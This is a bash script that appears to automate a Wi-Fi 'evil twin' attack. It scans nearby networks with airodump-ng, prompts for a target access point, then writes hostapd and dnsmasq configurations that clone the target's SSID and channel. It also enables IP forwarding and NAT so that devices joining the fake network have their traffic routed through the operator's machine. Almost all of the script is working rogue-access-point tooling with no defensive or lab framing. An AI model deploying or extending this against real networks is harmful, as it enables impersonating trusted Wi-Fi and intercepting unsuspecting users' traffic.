#!/usr/bin/env bash

# Pour retirer les espaces.
sanitize_ssid() {
    TARGET_SSID="$(echo "$TARGET_SSID" | sed 's/^[[:space:]]*//;s/[[:space:]]*$//')"
    SAFE_SSID="$(echo "$TARGET_SSID" | tr ' /' '__')"
}


setup_ap_interface() {
    log "Configuring AP interface (gateway IP)"
    ip link set wlan2 up
    ip addr flush dev $IFACE_MON
    ip addr add 192.168.50.1/24 dev $IFACE_MON
    log "IP for $IFACE_MON properly configured."
}

enable_ip_forwarding() {    
    log "Enabling IPv4 forwarding (router mode)"
    sudo sysctl -w net.ipv4.ip_forward=1
}

setup_nat() {
    log "Configuring NAT masquerading"
    detect_inet_interface

    iptables -t nat -A POSTROUTING -o "$IFACE_INET" -j MASQUERADE
    iptables -A FORWARD -i "$IFACE_MON" -o "$IFACE_INET" -j ACCEPT
    iptables -A FORWARD -i "$IFACE_INET" -o "$IFACE_MON" -m state --state RELATED,ESTABLISHED -j ACCEPT

    log "NAT rules applied ($IFACE_MON → $IFACE_INET)"
}



enable_monitor_mode() {
    log "Activating monitor mode on: $IFACE_MON"

    if ! ip link set "$IFACE_MON" down; then
        die "Failed to bring interface down"
    fi

    if ! iw "$IFACE_MON" set monitor control; then
        die "Monitor mode not supported"
    fi

    if ! ip link set "$IFACE_MON" up; then
        die "Failed to bring interface up"
    fi

    log "Monitor mode activated"
}

scan_environment() {
    log "Scanning all channels..."
    trap 'log "Scan stopped by user"; reset; trap - SIGINT; return' SIGINT

    airodump-ng \
        --output-format csv,pcap \
        --write "$CAPTURE_PREFIX" \
        "$IFACE_MON"

    trap - SIGINT
    reset

    [[ -f "$CSV_FILE" ]] || die "CSV file not created"
    [[ -f "$PCAP_FILE" ]] || die "PCAP file not created"
}

parse_csv() {
    log "Parsing CSV file"

    AP_LIST="/tmp/ap_list.$$"

    sed '/^Station MAC/,$d' "$CSV_FILE" \
        | sed '1,2d' \
        | cut -d',' -f1,4,14 \
        | sed 's/^[ \t]*//;s/[ \t]*$//' \
        > "$AP_LIST"

    [[ -s "$AP_LIST" ]] || die "No AP found"

    echo
    nl -w2 -s'] ' "$AP_LIST" \
        | sed 's/^/[/' \
        | sed 's/, */ | CH=/2; s/, */ | ESSID=/3'
}

select_target_ap() {
    echo
    read -rp "Select the target AP (number): " choice

    [[ "$choice" =~ ^[0-9]+$ ]] || die "Invalid input"

    line=$(sed -n "${choice}p" /tmp/ap_list.$$)
    [[ -n "$line" ]] || die "Invalid selection"

    TARGET_BSSID=$(cut -d',' -f1 <<< "$line")
    TARGET_CHANNEL=$(cut -d',' -f2 <<< "$line" | tr -d '[:space:]')
    TARGET_SSID=$(cut -d',' -f3 <<< "$line")

    log "Target selected:"
    log "  BSSID   : $TARGET_BSSID"
    log "  CHANNEL : $TARGET_CHANNEL"
    log "  SSID    : ${TARGET_SSID:-<hidden>}"
}




generate_dnsmasq_conf() {
    DNSMASQ_CONF="$SHARED_DIR/dnsmasq_${SAFE_SSID}.conf"

    log "Generating dnsmasq configuration"

    {
        echo "interface=$IFACE_MON"
        echo "bind-interfaces"
        echo "dhcp-range=192.168.50.10,192.168.50.50,12h"
        echo "dhcp-option=3,192.168.50.1"
        echo "dhcp-option=6,8.8.8.8"
    } > "$DNSMASQ_CONF"

    log "dnsmasq config written to $DNSMASQ_CONF"
}


start_dnsmasq() {
    log "Starting DNSMASQ configuration file under : $DNSMASQ_CONF"
    sudo dnsmasq -d -C "$DNSMASQ_CONF" & DNSMASQ_PID=$!
    log "dnsmasq started (PID=$DNSMASQ_PID)"
}



generate_hostapd_conf() {
    HOSTAPD_CONF="$SHARED_DIR/airrecon_${SAFE_SSID}.conf"

    log "Generating hostapd configuration"

    if [[ "$TARGET_CHANNEL" -le 14 ]]; then
        HW_MODE="g"
        IEEE80211N=1
    else
        HW_MODE="a"
        IEEE80211N=1
    fi


    {
        echo "interface=$IFACE_MON"
        echo "driver=nl80211"
        echo "ssid=$TARGET_SSID"
        echo "channel=$TARGET_CHANNEL"
        echo "hw_mode=$HW_MODE"
        echo "ieee80211n=$IEEE80211N"
    } > "$HOSTAPD_CONF"

    log "hostapd config written to $HOSTAPD_CONF"
}

start_hostapd() {
    log "[TESTING] Starting hostapd"
    sudo hostapd "$HOSTAPD_CONF" & HOSTAPD_PID=$!
    log "hostapd started (PID=$HOSTAPD_PID)"
}

